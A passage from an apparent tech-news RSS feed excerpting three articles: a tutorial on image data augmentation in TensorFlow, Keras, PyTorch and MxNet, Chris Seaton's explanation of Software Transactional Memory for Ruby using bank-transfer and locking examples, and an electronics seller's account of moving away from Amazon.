<p>As mentioned above in <a href="https://towardsdatascience.com/data-augmentation-for-deep-learning-4fe21d1a4eb9" target="_blank" rel="noreferrer noopener nofollow"><strong>Deep Learning,</strong> <strong>Data Augmentation</strong></a> is a common practice. Therefore, every DL framework has its own augmentation methods or even a whole library. For example, let‚Äôs see how to apply image augmentations using built-in methods in TensorFlow (TF) and Keras, PyTorch, and <strong>MxNet</strong>.<br></p>






<h3><strong>Data Augmentation in TensorFlow and Keras</strong></h3>



<p>To augment images when using <strong>TensorFlow</strong> or <strong>Keras</strong> as our <strong>DL</strong> framework we can:</p>



<ul><li>Write our own augmentation pipelines or layers using <strong>tf.image</strong>.</li><li>Use <strong>Keras</strong> preprocessing layers</li><li>Use <strong>ImageDataGenerator</strong></li></ul>



<h4><strong>Tf.image</strong></h4>



<p>Let‚Äôs take a closer look on the first technique and define a function that will visualize an image and then apply the flip to that image using <strong>tf.image</strong>. You may see the code and the result below.</p>



<pre><span><span>def</span> <span>visualize</span><span>(original, augmented)</span>:</span>
    fig = plt.figure()
    plt.subplot(<span>1</span>,<span>2</span>,<span>1</span>)
    plt.title(<span>'Original image'</span>)
    plt.imshow(original)

    plt.subplot(<span>1</span>,<span>2</span>,<span>2</span>)
    plt.title(<span>'Augmented image'</span>)
    plt.imshow(augmented)
    flipped = tf.image.flip_left_right(image)
    visualize(image, flipped)</pre>



<div><figure><img loading="lazy" width="375" height="148" src="https://i2.wp.com/neptune.ai/wp-content/uploads/image-augmentation.png?resize=375%2C148&amp;ssl=1" alt="image augmentation" srcset="https://i2.wp.com/neptune.ai/wp-content/uploads/image-augmentation.png?w=375&amp;ssl=1 375w, https://i2.wp.com/neptune.ai/wp-content/uploads/image-augmentation.png?resize=300%2C118&amp;ssl=1 300w" sizes="(max-width: 375px) 100vw, 375px" data-recalc-dims="1"></figure></div>



<p>For finer control you can write your own augmentation pipeline. In most cases it is useful to apply augmentations on a whole dataset, not a single image. You can implement it as follows.</p>



<pre><span>import</span> tensorflow_datasets <span>as</span> tfds 

<span><span>def</span> <span>augment</span><span>(image, label)</span>:</span>
  image = tf.cast(image, tf.float32)
  image = tf.image.resize(image, [IMG_SIZE, IMG_SIZE])
  image = (image / <span>255.0</span>)
  image = tf.image.random_crop(image, size=[IMG_SIZE, IMG_SIZE, <span>3</span>])
  image = tf.image.random_brightness(image, max_delta=<span>0.5</span>)
  <span>return</span> image, label

(train_ds, val_ds, test_ds), metadata = tfds.load(
    <span>'tf_flowers'</span>,
     split=[<span>'train[:80%]'</span>, <span>'train[80%:90%]'</span>, <span>'train[90%:]'</span>],
     with_info=<span>True</span>,
     as_supervised=<span>True</span>,)

train_ds = train_ds
            .shuffle(<span>1000</span>)
            .map(augment, num_parallel_calls=tf.data.experimental.AUTOTUNE)
            .batch(batch_size)
            .prefetch(AUTOTUNE)</pre>



<p>Of course, that is just the tip of the iceberg. <strong>TensorFlow</strong> API has plenty of augmentation techniques. If you want to read more on the topic please check the <a href="https://www.tensorflow.org/tutorials/images/data_augmentation?hl=en" target="_blank" rel="noreferrer noopener nofollow">official documentation </a>or <a href="https://www.wouterbulten.nl/blog/tech/data-augmentation-using-tensorflow-data-dataset/" target="_blank" rel="noreferrer noopener nofollow">other articles</a>.</p>



<h4><strong>Keras preprocessing&nbsp;</strong></h4>



<p>As mentioned above, <strong>Keras</strong> has a variety of preprocessing layers that may be used for <strong>Data Augmentation</strong>. You can apply them as follows.</p>



<pre>data_augmentation = tf.keras.Sequential([
     layers.experimental.preprocessing.RandomFlip(<span>"horizontal_and_vertical"</span>),
     layers.experimental.preprocessing.RandomRotation(<span>0.2</span>)])

image = tf.expand_dims(image, <span>0</span>)
plt.figure(figsize=(<span>10</span>, <span>10</span>))

<span>for</span> i <span>in</span> range(<span>9</span>):
  augmented_image = data_augmentation(image)
  ax = plt.subplot(<span>3</span>, <span>3</span>, i + <span>1</span>)
  plt.imshow(augmented_image[<span>0</span>])
  plt.axis(<span>"off"</span>)</pre>



<div><figure><img loading="lazy" width="572" height="507" src="https://i0.wp.com/neptune.ai/wp-content/uploads/data-augmentation-in-keras.png?resize=572%2C507&amp;ssl=1" alt="data augmentation in keras" srcset="https://i0.wp.com/neptune.ai/wp-content/uploads/data-augmentation-in-keras.png?w=572&amp;ssl=1 572w, https://i0.wp.com/neptune.ai/wp-content/uploads/data-augmentation-in-keras.png?resize=300%2C266&amp;ssl=1 300w" sizes="(max-width: 572px) 100vw, 572px" data-recalc-dims="1"></figure></div>



<h4><strong>Keras ImageDataGenerator</strong></h4>



<p>Also, you may use <strong>ImageDataGenerator</strong> (<strong>tf.keras.preprocessing.image.ImageDataGenerator</strong>) that generates batches of tensor images with real-time <strong>DA</strong>.</p>



<pre>datagen = ImageDataGenerator(rotation_range=<span>90</span>)
datagen.fit(x_train)


<span>for</span> X_batch, y_batch <span>in</span> datagen.flow(x_train, y_train, batch_size=<span>9</span>):
    <span>for</span> i <span>in</span> range(<span>0</span>, <span>9</span>):
        pyplot.subplot(<span>330</span> + <span>1</span> + i)
        pyplot.imshow(X_batch[i].reshape(img_rows, img_cols, <span>3</span>))
        pyplot.show()
    <span>break</span>
</pre>



<div><figure><img loading="lazy" src="https://i1.wp.com/neptune.ai/wp-content/uploads/image-data-generator.png?resize=768%2C437&amp;ssl=1" alt="image data generator" width="768" height="437" srcset="https://i1.wp.com/neptune.ai/wp-content/uploads/image-data-generator.png?resize=1024%2C583&amp;ssl=1 1024w, https://i1.wp.com/neptune.ai/wp-content/uploads/image-data-generator.png?resize=300%2C171&amp;ssl=1 300w, https://i1.wp.com/neptune.ai/wp-content/uploads/image-data-generator.png?resize=768%2C437&amp;ssl=1 768w, https://i1.wp.com/neptune.ai/wp-content/uploads/image-data-generator.png?w=1230&amp;ssl=1 1230w" sizes="(max-width: 768px) 100vw, 768px" data-recalc-dims="1"></figure></div>



<hr>



<p><strong>See related articles:&nbsp;</strong></p>



<ul><li><a href="https://neptune.ai/blog/keras-loss-functions" target="_blank" rel="noreferrer noopener nofollow">Keras Loss Functions: Everything You Need To Know</a></li><li><a href="https://neptune.ai/blog/keras-metrics" target="_blank" rel="noreferrer noopener nofollow">Keras Metrics: Everything You Need To Know</a></li><li><a href="https://docs.neptune.ai/integrations/keras.html" target="_blank" rel="noreferrer noopener nofollow">Neptune-Keras Integration</a></li></ul>



<hr>






<h3><strong>Data Augmentation in PyTorch and MxNet</strong></h3>



<h4><strong>Transforms in Pytorch</strong></h4>



<p><strong>Transforms</strong> library is the augmentation part of the <strong>torchvision</strong> package that consists of popular datasets, model architectures, and common image transformations for <strong>Computer Vision</strong> tasks.&nbsp;</p>



<p>To install <strong>Transforms</strong> you simply need to install<strong> torchvision</strong>:</p>



<pre>pip3 install torch torchvision
</pre>



<p><strong>Transforms</strong> library contains different image transformations that can be chained together using the <strong>Compose</strong> method. Functionally, <strong>Transforms has a variety of augmentation techniques implemented</strong>. You can combine them by using <strong>Compose</strong> method. Just check the <a href="https://pytorch.org/docs/stable/torchvision/transforms.html" target="_blank" rel="noreferrer noopener nofollow">official documentation</a> and you will certainly find the augmentation for your task.</p>



<p>Additionally, there is the <strong>torchvision.transforms.functional</strong> module. It has various functional transforms that give fine-grained control over the transformations. It might be really useful if you are building a more complex augmentation pipeline, for example, in the case of segmentation tasks.</p>



<p>Besides that, <strong>Transforms</strong> doesn‚Äôt have a unique feature. It‚Äôs used mostly with <strong>PyTorch</strong> as it‚Äôs considered a built-in augmentation library.</p>



<hr>



<p><strong>See related articles:</strong></p>



<ul><li><a href="https://neptune.ai/blog/pytorch-lightning-neptune-integration" target="_blank" rel="noreferrer noopener nofollow">How to Keep Track of PyTorch Lightning Experiments with Neptune</a></li></ul>



<hr>



<p><strong>Sample usage of PyTorch Transforms</strong></p>



<p>Let‚Äôs see how to apply augmentations using <strong>Transforms</strong>. You should keep in mind that <strong>Transforms </strong>works only with <strong>PIL</strong> images. That is why you should either read an image in <strong>PIL</strong> format or add the necessary transformation to your augmentation pipeline.</p>



<pre><span>from</span> torchvision <span>import</span> transforms <span>as</span> tr
<span>from</span> torchvision.transfroms <span>import</span> Compose

pipeline = Compose(
             [tr.RandomRotation(degrees = <span>90</span>),
              tr.RandomRotation(degrees = <span>270</span>)])

augmented_image = pipeline(img = img)</pre>



<p>Sometimes you might want to write a custom <strong>Dataloader</strong> for the training. Let‚Äôs see how to apply augmentations via <strong>Transforms</strong> if you are doing so.</p>



<pre><span>from</span> torchvision <span>import</span> transforms
<span>from</span> torchvision.transforms <span>import</span> Compose <span>as</span> C

<span><span>def</span> <span>aug</span><span>(p=<span>0.5</span>)</span>:</span>
    <span>return</span> C([transforms.RandomHorizontalFlip()], p=p)

<span><span>class</span> <span>Dataloader</span><span>(object)</span>:</span>
    <span><span>def</span> <span>__init__</span><span>(self, train, csv, transform=None)</span>:</span>
        ...

    <span><span>def</span> <span>__getitem__</span><span>(self, index)</span>:</span>
        ...
        img = aug()(**{<span>'image'</span>: img})[<span>'image'</span>]
        <span>return</span> img, target

    <span><span>def</span> <span>__len__</span><span>(self)</span>:</span>
        <span>return</span> len(self.image_list)

trainset = Dataloader(train=<span>True</span>, csv=<span>'/path/to/file/'</span>, transform=aug)</pre>



<h4><strong>Transforms in MxNet</strong></h4>



<p><strong>Mxnet</strong> also has a built-in augmentation library called <strong>Transforms </strong>(<strong>mxnet.gluon.data.vision.transforms</strong>). It is pretty similar to <strong>PyTorch Transforms</strong> library. There is pretty much nothing to add. Check the <strong>Transforms</strong> section above if you want to find more on this topic. General usage is as follows.</p>



<p><strong>Sample usage of MxNet Transforms</strong></p>



<pre>color_aug = transforms.RandomColorJitter(
                               brightness=<span>0.5</span>,
                               contrast=<span>0.5</span>,
                               saturation=<span>0.5</span>,
                               hue=<span>0.5</span>)</pre></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://neptune.ai/blog/data-augmentation-in-python">https://neptune.ai/blog/data-augmentation-in-python</a></em></p>]]>
            </description>
            <link>https://neptune.ai/blog/data-augmentation-in-python</link>
            <guid isPermaLink="false">hacker-news-small-sites-24932171</guid>
            <pubDate>Thu, 29 Oct 2020 16:23:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Context on Software Transactional Memory in Ruby]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24932113">thread link</a>) | @pvsukale3
<br/>
October 29, 2020 | https://chrisseaton.com/truffleruby/ruby-stm/ | <a href="https://web.archive.org/web/*/https://chrisseaton.com/truffleruby/ruby-stm/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>

<header>

<h2><a href="https://chrisseaton.com/">Chris Seaton</a>, 28 October 2020</h2>


</header>

<p>There‚Äôs a proposal to add <em>Software Transactional Memory</em>, or <em>STM</em>, to the Ruby programming language. This is part of a wider effort to add better support for concurrency and parallelism in Ruby, and in particular the idea of <em>ractors</em>. A concept has been <a href="https://bugs.ruby-lang.org/issues/17261">proposed</a> and <a href="https://github.com/ruby/ruby/pull/3652">implemented</a> by Koichi Sasada.</p>

<figure>
<img src="https://chrisseaton.com/truffleruby/ruby-stm/testBoard.gif" width="50%">
<figcaption>An animation of the algorithm we're going to use as an example of STM - we'll explain this later on</figcaption>
</figure>

<p>This article gives some context on what STM is, how you use it, and why you might want to use it. We‚Äôll show an application which is well-suited to STM and we‚Äôll use this to talk about the benefits, issues, and some open questions.</p>

<p>We‚Äôll finish by setting a challenge for STM in Ruby.</p>

<p>I wrote the first half of my PhD on STM, and the second half on Ruby, so I‚Äôve got quite a bit of experience with both and the idea of their combination is very interesting to me.</p>

<h2 id="why-might-we-want-an-stm">Why might we want an STM?</h2>

<p>Let‚Äôs say we‚Äôre a bank managing many bank accounts. Each account has a total. We get a never-ending stream of requests to move a sum of money <code>m</code> from an account <code>a</code> to account <code>b</code>.</p>

<div><div><pre><code><span>loop</span> <span>do</span>
  <span>a</span><span>,</span> <span>b</span><span>,</span> <span>m</span> <span>=</span> <span>get_next_transfer</span>
  <span>accounts</span><span>[</span><span>a</span><span>]</span> <span>-=</span> <span>m</span>
  <span>accounts</span><span>[</span><span>b</span><span>]</span> <span>+=</span> <span>m</span>
<span>end</span>
</code></pre></div></div>

<p>Something not everyone may know about Ruby is that <code>x += y</code> is equivalent to writing <code>t = x; x = t + y</code>. We‚Äôll write that out in full to make that clear to ourselves.</p>

<div><div><pre><code><span>loop</span> <span>do</span>
  <span>a</span><span>,</span> <span>b</span><span>,</span> <span>m</span> <span>=</span> <span>get_next_transfer</span>
  <span>a_balance</span> <span>=</span> <span>accounts</span><span>[</span><span>a</span><span>]</span>
  <span>accounts</span><span>[</span><span>a</span><span>]</span> <span>=</span> <span>a_balance</span> <span>-</span> <span>m</span>
  <span>b_balance</span> <span>=</span> <span>accounts</span><span>[</span><span>b</span><span>]</span>
  <span>accounts</span><span>[</span><span>b</span><span>]</span> <span>=</span> <span>b_balance</span> <span>+</span> <span>m</span>
<span>end</span>
</code></pre></div></div>

<p>We‚Äôve got a lot of transfers to run through, so we‚Äôll have multiple threads processing these transfers.</p>

<div><div><pre><code><span>n</span><span>.</span><span>times</span> <span>do</span>
  <span>Thread</span><span>.</span><span>new</span>
    <span>loop</span> <span>do</span>
      <span>a</span><span>,</span> <span>b</span><span>,</span> <span>m</span> <span>=</span> <span>get_next_transfer</span>
      <span>a_balance</span> <span>=</span> <span>accounts</span><span>[</span><span>a</span><span>]</span>
      <span>accounts</span><span>[</span><span>a</span><span>]</span> <span>=</span> <span>a_balance</span> <span>-</span> <span>m</span>
      <span>b_balance</span> <span>=</span> <span>accounts</span><span>[</span><span>b</span><span>]</span>
      <span>accounts</span><span>[</span><span>b</span><span>]</span> <span>=</span> <span>b_balance</span> <span>+</span> <span>m</span>
    <span>end</span>
  <span>end</span>
<span>end</span>
</code></pre></div></div>

<p>We‚Äôve got a few problems here now. With all these threads running at the same time, what happens if two threads are putting money into your account concurrently?</p>

<div><div><pre><code><span>accounts</span><span>[</span><span>a</span><span>]</span> <span>=</span> <span>100</span>

<span># thread 1                        # thread 2</span>
<span>balance</span> <span>=</span> <span>accounts</span><span>[</span><span>a</span><span>]</span>
  <span># balance = 100</span>
                                  <span>balance</span> <span>=</span> <span>accounts</span><span>[</span><span>a</span><span>]</span>
                                    <span># balance = 100</span>
<span>accounts</span><span>[</span><span>a</span><span>]</span> <span>=</span> <span>balance</span> <span>+</span> <span>10</span>
  <span># accounts[a] = 110</span>
                                  <span>accounts</span><span>[</span><span>a</span><span>]</span> <span>=</span> <span>balance</span> <span>+</span> <span>10</span>
                                    <span># accounts[a] = 110</span>
</code></pre></div></div>

<p>The two transfers have run, but your balance is 110. The other 10 has been lost - this is called a <em>lost update</em>, meaning it‚Äôs as if the update was never made.</p>

<p>Also consider what happens if the thread crashes after taking money from <code>a</code> but before putting it into <code>b</code>? The transfer would be applied partially and again we‚Äôd lose money.</p>

<p>We need to use some kind of <em>synchronization</em> on our accounts. Ruby has <em>mutual exclusion locks</em> or <em>mutexes</em>, so we can try using those.</p>

<div><div><pre><code><span>n</span><span>.</span><span>times</span> <span>do</span>
  <span>Thread</span><span>.</span><span>new</span>
    <span>loop</span> <span>do</span>
      <span>a</span><span>,</span> <span>b</span><span>,</span> <span>m</span> <span>=</span> <span>get_next_transfer</span>
      <span>locks</span><span>[</span><span>a</span><span>].</span><span>synchronize</span> <span>do</span>
        <span>locks</span><span>[</span><span>b</span><span>].</span><span>synchronize</span> <span>do</span>
          <span>accounts</span><span>[</span><span>a</span><span>]</span> <span>-=</span> <span>m</span>
          <span>accounts</span><span>[</span><span>b</span><span>]</span> <span>+=</span> <span>m</span>
        <span>end</span>
      <span>end</span>
    <span>end</span>
  <span>end</span>
<span>end</span>
</code></pre></div></div>

<p>Does this work? What if we process a transfer from account 1001 to account 1002 on one thread at the same time as processing a transfer from account 1002 to 1001, so the other way around, at the same time?</p>

<p>The first thread will try to lock 1001 and then 1002. The second thread will try to lock 1002 and then 1001. If the first thread gets as far as locking 1001, and the second as far as locking 1002, then both will be waiting for the opposite lock and will never release the lock they already have. We will be in <em>deadlock</em>.</p>

<p>If we always acquired locks in the same order, by collecting them up first and sorting them, we could fix this.</p>

<div><div><pre><code><span>n</span><span>.</span><span>times</span> <span>do</span>
  <span>Thread</span><span>.</span><span>new</span>
    <span>loop</span> <span>do</span>
      <span>a</span><span>,</span> <span>b</span><span>,</span> <span>m</span> <span>=</span> <span>get_next_transfer</span>
      <span>x</span><span>,</span> <span>y</span> <span>=</span> <span>[</span><span>a</span><span>,</span> <span>b</span><span>].</span><span>sort</span>
      <span>locks</span><span>[</span><span>x</span><span>].</span><span>synchronize</span> <span>do</span>
        <span>locks</span><span>[</span><span>y</span><span>].</span><span>synchronize</span> <span>do</span>
          <span>accounts</span><span>[</span><span>a</span><span>]</span> <span>-=</span> <span>m</span>
          <span>accounts</span><span>[</span><span>b</span><span>]</span> <span>+=</span> <span>m</span>
        <span>end</span>
      <span>end</span>
    <span>end</span>
  <span>end</span>
<span>end</span>
</code></pre></div></div>

<p>Now in both transfers account 1001 is locked first and 1002 is locked second. That will work.</p>

<p>We have to make up a somewhat artificial requirement to explain the next issue, but consider if for some good reason we wanted to transfer to one account if we had a lot of money, and a different account if we only had a little money. Maybe if we‚Äôre rich this month we donate to charity, otherwise we unfortunately need to save for ourselves.</p>

<div><div><pre><code>if account balance &gt; 1000
  transfer 10 to charity
else
  transfer 10 to savings
end
</code></pre></div></div>

<p>We‚Äôll talk about accounts <code>a</code>, <code>b</code>, and <code>c</code>, now, and a threshold of money <code>t</code>.</p>

<div><div><pre><code><span>n</span><span>.</span><span>times</span> <span>do</span>
  <span>Thread</span><span>.</span><span>new</span>
    <span>loop</span> <span>do</span>
      <span>a</span><span>,</span> <span>b</span><span>,</span> <span>c</span><span>,</span> <span>t</span><span>,</span> <span>m</span> <span>=</span> <span>get_next_transfer</span>
      <span>x</span><span>,</span> <span>y</span><span>,</span> <span>z</span> <span>=</span> <span>[</span><span>a</span><span>,</span> <span>b</span><span>,</span> <span>c</span><span>].</span><span>sort</span>
      <span>locks</span><span>[</span><span>x</span><span>].</span><span>synchronize</span> <span>do</span>
        <span>locks</span><span>[</span><span>y</span><span>].</span><span>synchronize</span> <span>do</span>
          <span>locks</span><span>[</span><span>z</span><span>].</span><span>synchronize</span> <span>do</span>
            <span>if</span> <span>accounts</span><span>[</span><span>a</span><span>]</span> <span>&gt;</span> <span>t</span>
              <span>accounts</span><span>[</span><span>a</span><span>]</span> <span>-=</span> <span>m</span>
              <span>accounts</span><span>[</span><span>b</span><span>]</span> <span>+=</span> <span>m</span>
            <span>else</span>
              <span>accounts</span><span>[</span><span>a</span><span>]</span> <span>-=</span> <span>m</span>
              <span>accounts</span><span>[</span><span>c</span><span>]</span> <span>+=</span> <span>m</span>
            <span>end</span>
          <span>end</span>
        <span>end</span>
      <span>end</span>
    <span>end</span>
  <span>end</span>
<span>end</span>
</code></pre></div></div>

<p>It‚Äôs starting to get very complicated. And this locks more than it needs to - it locks both <code>b</code> and <code>c</code> but then only uses one of them. If you use <code>b</code> in the end, ideally another thread could be serving a transfer to <code>c</code> at the same time, but you‚Äôve locked it and it can‚Äôt. Imagine if instead of two potential accounts it was thousands and you had to lock them all. Imagine if you couldn‚Äôt work out at all which account you‚Äôd be transferring to until you started the transfer - then you‚Äôd never be able to process two transfers at the same time.</p>

<p>At this point as well we‚Äôre likely to start to make errors trying to do all this locking and ordering of locks and things.</p>

<p>Stepping back and taking it all in, we can draw up some requirements for what we need.</p>

<ul>
  <li><em>atomicity</em> - that all writes in the transfer are applied or none are applied</li>
  <li><em>consistency</em> - meaning that our data structures are always valid - the total sum of money never changes</li>
  <li><em>isolation</em> - meaning one transfer does not interfere with another</li>
  <li><em>durability</em> - meaning that when applied the transfer is available to all subsequent transactions</li>
</ul>

<p>Ideally a library or the language could do this all for us. We‚Äôd like to be able to write almost what we originally wrote, but with just an annotation to make the code inside a block atomic, consistent, isolated, and the result durable.</p>

<div><div><pre><code><span>n</span><span>.</span><span>times</span> <span>do</span>
  <span>Thread</span><span>.</span><span>new</span>
    <span>loop</span> <span>do</span>
      <span>a</span><span>,</span> <span>b</span><span>,</span> <span>m</span> <span>=</span> <span>get_next_transfer</span>
      <span>atomically</span> <span>do</span>
        <span>accounts</span><span>[</span><span>a</span><span>]</span> <span>-=</span> <span>m</span>
        <span>accounts</span><span>[</span><span>b</span><span>]</span> <span>+=</span> <span>m</span>
      <span>end</span>
    <span>end</span>
  <span>end</span>
<span>end</span>
</code></pre></div></div>

<p>This is what a <em>transactional</em> memory can let us do. It will automatically monitor what you read and write inside the <code>atomically</code> block, which is a <em>transaction</em>, and will make sure it is either applied fully or not, that the balance of the whole system is always consistent, that transactions do not see the result of each other partially applied, and that writes appear and stay.</p>

<p>It may be implemented using the code we eventually arrived at ourselves, or it could do something else instead. In practice how it is often implemented is that
reads and writes are stored in a log, then at the end the transaction works out if anyone else has written locations that you‚Äôve read. If they have then the values you read are no longer valid, so your transaction <em>conflicts</em> with another, is <em>aborted</em> and retries, reading the locations again. When it eventually does not conflict with any other transactions it is <em>committed</em> and succeeds. This means you don‚Äôt need to lock everything up-front, which means you avoid the problem of what happens if you may potentially need every account. Locking everything up-front is called <em>pessimistic locking</em>. We‚Äôre moving to <em>optimistic locking</em></p>

<h2 id="the-proposed-stm">The proposed STM</h2>

<p>Koichi‚Äôs <a href="https://bugs.ruby-lang.org/issues/17261">proposed</a> STM for Ruby, in combination with his proposed <em>ractors</em> (similar to <em>actors</em>) would look like this.</p>

<div><div><pre><code><span>accounts</span> <span>=</span> <span>9999</span><span>.</span><span>times</span><span>.</span><span>map</span> <span>{</span> <span>Thread</span><span>::</span><span>TVar</span><span>.</span><span>new</span><span>(</span><span>100</span><span>)</span> <span>}</span>

<span>n</span><span>.</span><span>times</span> <span>do</span>
  <span>Ractor</span><span>.</span><span>new</span> <span>*</span><span>accounts</span> <span>do</span> <span>|*</span><span>accounts</span><span>|</span>
    <span>loop</span> <span>do</span>
      <span>a</span><span>,</span> <span>b</span><span>,</span> <span>m</span> <span>=</span> <span>get_next_transfer</span>
      <span>Thread</span><span>.</span><span>atomically</span> <span>do</span>
        <span>accounts</span><span>[</span><span>a</span><span>].</span><span>value</span> <span>-=</span> <span>m</span>
        <span>accounts</span><span>[</span><span>b</span><span>].</span><span>value</span> <span>+=</span> <span>m</span>
      <span>end</span>
    <span>end</span>
  <span>end</span>
<span>end</span>
</code></pre></div></div>

<p>He‚Äôs using a <code>Ractor</code> but you can think of it as a thread for the purposes of this article. Instead of an array of account balances, we now have an array of <code>TVar</code> objects that contain values. A <code>TVar</code> is a <em>transactional variable</em>. Only these variables are transactional - not any other Ruby value you read or write. His design requires that the <code>TVar</code> objects you‚Äôre going to use are passed into the <code>Ractor</code>, due to rules about sharing that aren‚Äôt relevant for this article.</p>

<p>This looks good, doesn‚Äôt it!</p>

<h2 id="a-more-complex-application">A more complex application</h2>

<p>Let‚Äôs consider a larger application, in order to illustrate further and to talk about some issues and open questions. The <a href="https://github.com/chrisseaton/ruby-stm-lee-demo">code is available on GitHub</a>.</p>

<p>Let‚Äôs say it‚Äôs our job to lay out the wires on a circuit board. We get a board with <em>pads</em> (connections to components mounted on the board) and a list of <em>routes</em> that we need to draw between these pads. There are a great many pads and routes, there isn‚Äôt much space on the tiny board, and another catch is that it‚Äôs very expensive to have wires crossing each other. Let‚Äôs say it‚Äôs exponentially more expensive for more deeply stacked wires.</p>

<figure>
<img src="https://chrisseaton.com/truffleruby/ruby-stm/minimal.svg" width="25%">
<figcaption>A minimal board and a solution</figcaption>
</figure>

<p>In this minimal example we we can see two routes, and how they have to cross each other.</p>

<figure>
<img src="https://chrisseaton.com/truffleruby/ruby-stm/mainboard.svg" width="50%">
<figcaption>A processor module board and a solution</figcaption>
</figure>

<p>This example is a processor module and shows what kind of scale we might want to be working at. This board has many longer routes which are more likely to conflict.</p>

<figure>
<img src="https://chrisseaton.com/truffleruby/ruby-stm/memboard.svg" width="50%">
<figcaption>A memory module board and a solution</figcaption>
</figure>

<p>This example is a memory module. It has many shorter routes which we may expect to conflict less.</p>

<figure>
<img src="https://chrisseaton.com/truffleruby/ruby-stm/testBoard.svg" width="50%">
<figcaption>The test board we'll use and a solution</figcaption>
</figure>

<p>We‚Äôll use this test board, which is somewhere between all these extremes.</p>

<p>There‚Äôs an algorithm to lay each routes, and it actually produces an optimal solution for an individual route, but not for all routes. It‚Äôs called <em>Lee‚Äôs algorithm</em> and was published back in 1960. We‚Äôll ‚Ä¶</p></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://chrisseaton.com/truffleruby/ruby-stm/">https://chrisseaton.com/truffleruby/ruby-stm/</a></em></p>]]>
            </description>
            <link>https://chrisseaton.com/truffleruby/ruby-stm/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24932113</guid>
            <pubDate>Thu, 29 Oct 2020 16:18:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Joe Knows Electronics ‚Äì The End of an Amazon Era]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24932052">thread link</a>) | @sjackso
<br/>
October 29, 2020 | https://joeknowselectronics.com/the-end-of-an-amazon-era | <a href="https://web.archive.org/web/*/https://joeknowselectronics.com/the-end-of-an-amazon-era">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-id="5e3b555a" data-element_type="widget" data-widget_type="theme-post-content.default">
<div>
<p>Joe Knows Electronics has had a long relationship with Amazon. We started out as an Amazon seller in April of 2010. At that time LEDS were only available on Amazon in a quantity of 1 at a cost of around $1 each + $3.99 shipping. We saw an opportunity to fill a void. We started selling 25 packs of LEDs for $5.99 with free prime shipping.</p>
<p>After finding success in selling LEDs we moved on to provide other parts like resistors and capacitors. We stuck to that original idea of bundling components to maximize value. For resistors, rather than just sell one ohm value we sold 86 together. Most parts that someone might need could be purchased together for a single low price.</p>
<p>At first we sourced pre-made kits from China but quickly learned that people wanted more, both in terms of quality as well as organization. We undertook the task of setting up production to make thousands of kits a month, each containing hundreds of parts. It required hiring people, setting up a factory, and setting up a business process to manage all of it. The end result was the capacitor and resistor kits that became famous.</p>
<div><figure><img loading="lazy" width="300" height="300" src="https://joeknowselectronics.com/wp-content/uploads/2019/10/1-2-300x300.png" alt="" srcset="https://joeknowselectronics.com/wp-content/uploads/2019/10/1-2-300x300.png 300w, https://joeknowselectronics.com/wp-content/uploads/2019/10/1-2-1024x1024.png 1024w, https://joeknowselectronics.com/wp-content/uploads/2019/10/1-2-150x150.png 150w, https://joeknowselectronics.com/wp-content/uploads/2019/10/1-2-768x768.png 768w, https://joeknowselectronics.com/wp-content/uploads/2019/10/1-2-1536x1536.png 1536w, https://joeknowselectronics.com/wp-content/uploads/2019/10/1-2-600x600.png 600w, https://joeknowselectronics.com/wp-content/uploads/2019/10/1-2-100x100.png 100w, https://joeknowselectronics.com/wp-content/uploads/2019/10/1-2-64x64.png 64w, https://joeknowselectronics.com/wp-content/uploads/2019/10/1-2.png 2000w" sizes="(max-width: 300px) 100vw, 300px"></figure></div>
<p>Then growth stagnated for the same reason we were successful. Working within the Amazon system meant producing products that met a certain price, size, and complexity target. If a product was too cheap the Amazon fees would be higher than the cost of the product itself. The shipping costs for a small product shipped under the prime program were the same as shipping a larger product like our resistor kit. If a product was too simple there were 1000 (literally) other sellers undercutting each other to sell that same product. Only products that were too complicated and time consuming for sane people to manufacture, like our resistor kits, could find success and profitability. However, most electronics products don‚Äôt have a range of components that make sense as a large kit. There were some attempts to strike out at the fringes of what components people might buy but we never found success like we did in our core capacitor and resistor kits. The magic of Amazon that gave us life was also smothering our ability to grow.</p>
<p>Over the years we continued to produce our handful of core products and we did the job well. Products stayed in stock and quality was consistent. We cut costs where possible and made the process more efficient.</p>
<p>Over the same years Amazon also got greedy. We went from paying 10% commission to 15%. Instead of a fulfillment cost per order plus a low fee on extra units in the same order they started charging the full fulfillment cost on every single unit. On top of that Amazon started listing our products on page 3 of results or worse unless we spent 20-40% of the retail price in advertising. The walls were closing in over the years and there was no clear answer. Amazon makes up the majority of all online e-commerce, our sales were consistent, and it made sense to keep up the status quo rather than erase everything and try again. We made the product to work well with Amazon‚Äôs pricing structure and they wouldn‚Äôt make as much sense if sold on our own website. We also didn‚Äôt have the variety of products to sustain our own website. We made just a few SKUs in massive industrial volume.</p>
<p>In 2019 sales had fallen to the point where we were scaling down production in a major way. It was time for a change so we came up with a plan. It was a radical plan to phase out all of our products and move away from Amazon completely. Rather than sell larger assortments of parts we would sell those same parts as smaller assortments. We would abandon Amazon Prime and create our own prime in a way. Many of these smaller assortments could be purchased together to build your own kit. All of the components would follow a standardized packaging scheme. Components like resistors could be ordered in a smaller range of 12 values or as a complete set like what was available in our older set of 86. This had the following advantages:</p>
<ul><li>Lower cost per component than our existing component kits.</li><li>Easier for customers to reorder commonly used parts without reordering all parts in a kit.</li><li>Mix and match parts like resistors and capacitors to build your own kit rather than buy a bunch of parts not needed for a project.</li><li>Easier for us to produce</li><li>Not reliant on Amazon‚Äôs fulfillment</li><li>Able to sell cheaper components as single items rather than as a larger kit containing many items.</li></ul>
